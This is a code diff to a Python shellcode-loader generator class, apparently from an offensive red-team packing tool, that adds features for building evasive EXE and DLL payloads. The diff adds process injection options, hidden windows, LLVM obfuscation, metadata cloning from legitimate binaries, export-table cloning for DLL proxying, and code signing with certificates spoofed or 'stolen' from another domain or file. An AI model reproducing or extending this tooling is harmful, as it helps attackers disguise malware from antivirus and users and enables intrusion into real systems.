@@ -4,6 +4,7 @@ import subprocess
 import time
 import traceback
 from datetime import datetime
+from pathlib import Path
 
 from compilers.Compiler import CompilerException, Compiler
 from config.Config import Config
@@ -13,7 +14,8 @@ from engine.CodeWriter import CodeWriter
 from engine.Filter import Filter
 from enums.Language import Language
 from generators.Generator import Generator
-from utils import CarbonCopy
+from signers import CarbonCopy
+from utils.MetaTwin import MetaTwin
 from utils.console import Console
 from utils.utils import shellcode_signature, py_bin2sh, sgn
 
@@ -34,14 +36,26 @@ class NativeArtifactGenerator(Generator):
                  obfuscate: bool = False,
                  exports: str = None,
                  compiler: str = "cl",
-                 modules: list = None
+                 classname: str = None,
+                 function: str = None,
+                 params: str = None,
+                 modules: list = None,
+                 hide_window: bool = False,
+                 clone: str = None,
+                 domain: str = None,
+                 offline: bool = False,
+                 steal_from: str = None
                  ):
         super().__init__(file=file, chain=chain)
         self.arch = arch
+        self.hide_window = hide_window
         config = Config()
         self.placeholder = config.get("PLACEHOLDERS", "SHELLCODE")
         artifacts_path = config.get_path("DIRECTORIES", "ARTIFACTS")
         self.outfile = outfile
+
+        # Metadata
+        self.clone = Path(clone) if clone else None
 
         # DLL Wrap generates a Write-Execute DLL
         self.dll_wrap = dll
@@ -49,8 +63,14 @@ class NativeArtifactGenerator(Generator):
         self.dll = False
         if self.outfile.endswith("dll"):
             self.dll = True
+        # LI Encoding
         self.sgn = sgn
+        # Code Signing
         self.sign = sign
+        self.domain = domain
+        self.steal_from = steal_from
+        self.offline = offline if not steal_from else True
+
         self.exports = exports
         self.obj_files = []
 
@@ -59,46 +79,62 @@ class NativeArtifactGenerator(Generator):
         else:
             self.transformer = TransformerFactory.from_file(self.file)
 
-        # EXE Writer
-        self.exe_writer = CodeWriter(language=Language.CPP,
-                                     pinject=pinject,
-                                     process=process,
-                                     delay=delay,
-                                     modules=modules,
-                                     _filter=Filter(exclude=["dll"]),
-                                     arch=arch)
-        self.exe_writer.load_chain(chain=self.chain)
+        # If the loader is sRDI, we'll need a class / function to convert
+        kwargs = {"classname": classname, "function": function}
+        self.transformer.set_additional_arguments(kwargs={**kwargs})
+
+        self.need_parameter_module = False
+        try:
+            self.transformer.add_parameters(params=params)
+        except:
+            # print(f"[-] Warning: Transformer {self.transformer.__class__.__name__} does not support parameters")
+            self.need_parameter_module = True
+
+        self.exe_writer = None
+        self.dll_writer = None
         working_directory = Config().get_path("DIRECTORIES", "WRITER")
 
         basename = os.path.basename(os.path.splitext(outfile)[0])
         self.outfiles = {
-            "exe-temp": os.path.join(working_directory, f"{basename}-temp.exe"),
-            "dll-temp": os.path.join(working_directory, f"{basename}-temp.dll"),
+            "exe-temp": str(Path(working_directory).joinpath(f"{basename}-temp.exe").absolute()),
+            "dll-temp": str(Path(working_directory).joinpath(f"{basename}-temp.dll").absolute()),
             "exe": os.path.join(artifacts_path, "bison.exe"),
             "dll": os.path.join(artifacts_path, "sagat.dll"),
-            "exe-signed": os.path.join(artifacts_path, f"{basename}-signed.exe"),
-            "dll-signed": os.path.join(artifacts_path, f"{basename}-signed.dll"),
-            "exe-final": outfile,
-            "dll-final": f"{basename}.dll",
+            "exe-signed": str(Path(artifacts_path).joinpath(f"{basename}-signed.exe").absolute()),
+            "dll-signed": str(Path(artifacts_path).joinpath(f"{basename}-signed.dll").absolute()),
+            "exe-final": str(Path(outfile).absolute()),
+            "dll-final": str(Path(f"{os.path.splitext(outfile)[0]}.dll").absolute()),
         }
-
         if obfuscate:
             compiler = "llvm"
         self.compiler = Compiler.from_name(compiler, args={}, arch=self.arch)
-        self.compiler.default_exe_args(self.outfiles["exe-temp"])
+
+        if not self.dll:
+            self.compiler.default_exe_args(self.outfiles["exe-temp"])
+
+            # EXE Writer
+            self.exe_writer = CodeWriter(language=Language.CPP,
+                                         pinject=pinject,
+                                         process=process,
+                                         delay=delay,
+                                         modules=modules,
+                                         _filter=Filter(exclude=["dll"]),
+                                         arch=arch)
+            self.exe_writer.load_chain(chain=self.chain)
 
         # DLL Writer
-        self.dll_writer = None
-        if self.dll:
-            _dll_filter = Filter(include=["dll"], exclude=["write-execute"])
+        elif self.dll:
+            _dll_filter = Filter(include=["dll"])
 
             self.dll_writer = CodeWriter(
                 language=Language.CPP,
-                template=config.get_path("DIRECTORIES", "DLL"),
+                pinject=pinject,
+                process=process,
+                delay=delay,
                 _filter=_dll_filter,
                 modules=modules
             )
-        elif self.dll_wrap:
+        if self.dll_wrap:
             self.dll_writer = CodeWriter(
                 language=Language.CPP,
                 template=config.get_path("DIRECTORIES", "DLL"),
@@ -121,16 +157,24 @@ class NativeArtifactGenerator(Generator):
             raise FileNotFoundError("Error generating DLL")
 
     def sign_exe(self):
-        host = Config().get("SIGNING", "domain")
-        signer = CarbonCopy.CarbonCopy(verbose=False, host=host)
-        signer.sign(signee=self.outfiles["exe-temp"], signed=self.outfiles["exe-signed"])
+        super().sign(
+            signee=self.outfiles["exe-temp"],
+            signed=self.outfiles["exe-signed"],
+            clone=self.steal_from,
+            offline=self.offline,
+            domain=self.domain
+        )
         shutil.copy(self.outfiles["exe-signed"], self.outfiles['exe-temp'])
         self.dll_payload = py_bin2sh(self.outfiles["exe-temp"])
 
     def sign_dll(self):
-        host = Config().get("SIGNING", "domain")
-        signer = CarbonCopy.CarbonCopy(verbose=False, host=host)
-        signer.sign(signee=self.outfiles["dll-temp"], signed=self.outfiles["dll-signed"])
+        super().sign(
+            signee=self.outfiles["dll-temp"],
+            signed=self.outfiles["dll-signed"],
+            clone=self.steal_from,
+            offline=self.offline,
+            domain=self.domain
+        )
         shutil.copy(self.outfiles["dll-signed"], self.outfiles['dll-temp'])
 
     def finalise_exe(self):
@@ -142,7 +186,7 @@ class NativeArtifactGenerator(Generator):
 
     def finalise_dll(self):
         file = self.outfiles["dll-final"]
-        shutil.copy(self.outfiles['dll-temp'], file)
+        shutil.copy2(self.outfiles['dll-temp'], file)
         if os.path.isfile(file):
             Console.auto_line(f"    [+] Success: file stored at {file}")
         return file
@@ -152,7 +196,8 @@ class NativeArtifactGenerator(Generator):
         self.exe_writer.template.process_modules()
         self.compiler.default_exe_args(self.outfiles["exe-temp"])
         self.compiler.set_libraries(libs=self.exe_writer.template.libraries)
-
+        if self.hide_window:
+            self.compiler.hide_window()
         status = self.compiler.compile([self.exe_writer.outfile] + self.obj_files)
 
         if not os.path.isfile(self.outfiles["exe-temp"]):
@@ -163,11 +208,13 @@ class NativeArtifactGenerator(Generator):
         self.dll_payload = py_bin2sh(self.outfiles["exe-temp"])
 
     def clean(self):
-        artifacts = [self.exe_writer.outfile]
+        artifacts = []
         if self.dll:
             artifacts.append(self.dll_writer.outfile)
+        else:
+            artifacts.append(self.exe_writer.outfile)
         for file in artifacts:
-            os.unlink(file)
+            Path(file).unlink(missing_ok=True)
         base_paths = [".", "artifacts", "temp"]
         for base_path in base_paths:
             wildcards = [
@@ -200,8 +247,11 @@ class NativeArtifactGenerator(Generator):
     def generate(self):
         try:
             self.generate_wrapped()
-        except:
+        except SystemExit:
+            pass
+        except Exception as e:
             traceback.print_exc()
+        finally:
             self.clean()
 
     def generate_wrapped(self):
@@ -231,8 +281,9 @@ class NativeArtifactGenerator(Generator):
         shellcode = self.chain.encode(shellcode_bytes)
         step += 1
         template = self.exe_writer.template.template_name if not self.dll else self.dll_writer.template.template_name
+        temporary_file = f".\\temp\\{os.path.basename(self.exe_writer.outfile)}" if self.exe_writer else self.dll_writer.outfile
         Console.auto_line(f"[*] Phase {step}: Generating source files using {template}")
-        Console.auto_line(f"  [>] Phase {step}.{substep}: Writing CPP file in .\\temp\\{os.path.basename(self.exe_writer.outfile)}")
+        Console.auto_line(f"  [>] Phase {step}.{substep}: Writing CPP file in {temporary_file}")
         time.sleep(1)
         step += 1
         if not self.dll:
@@ -240,10 +291,15 @@ class NativeArtifactGenerator(Generator):
             Console.auto_line(f"  [>] Phase {step}.{substep}: Compiling EXE...")
             self.compile_exe(shellcode)
             substep += 1
-            Console.auto_line(f"    [+] Success: file stored at {self.outfile}")
+            Console.auto_line(f"    [+] Success: file stored at {self.outfiles['exe-temp']}")
             Console.auto_line(f"    [+] Shellcode Signature: {shellcode_signature(shellcode)}")
+            if self.clone:
+                Console.auto_line(f"  [>] Phase {step}.{substep}: Cloning metadata from another binary")
+                self.clone_metadata(Path(self.outfiles['exe-temp']))
+                substep += 1
             if self.sign:
                 Console.auto_line(f"  [>] Phase {step}.{substep}: Signing native binary")
+                self.sign_exe()
             step += 1
             substep = 1
         if self.dll or self.dll_wrap:
@@ -252,8 +308,16 @@ class NativeArtifactGenerator(Generator):
             self.compile_dll(shellcode if not self.dll_wrap else None)
             Console.auto_line(f"    [+] Success: file stored at {self.outfiles['dll-temp']}")
             substep += 1
+            if self.clone:
+                Console.auto_line(f"  [>] Phase {step}.{substep}: Cloning metadata from another binary")
+                self.clone_metadata(Path(self.outfiles['dll-temp']))
+                substep += 1
+                Console.auto_line(f"  [>] Phase {step}.{substep}: Cloning EAT via Koppeling")
+                self.clone_exports(Path(self.outfiles['dll-temp']))
+                substep += 1
+
             if self.sign:
-                Console.auto_line(f"  [>] Phase {step}.2: Signing native library")
+                Console.auto_line(f"  [>] Phase {step}.{substep}: Signing native library")
                 self.sign_dll()
             step += 1
         substep = 1
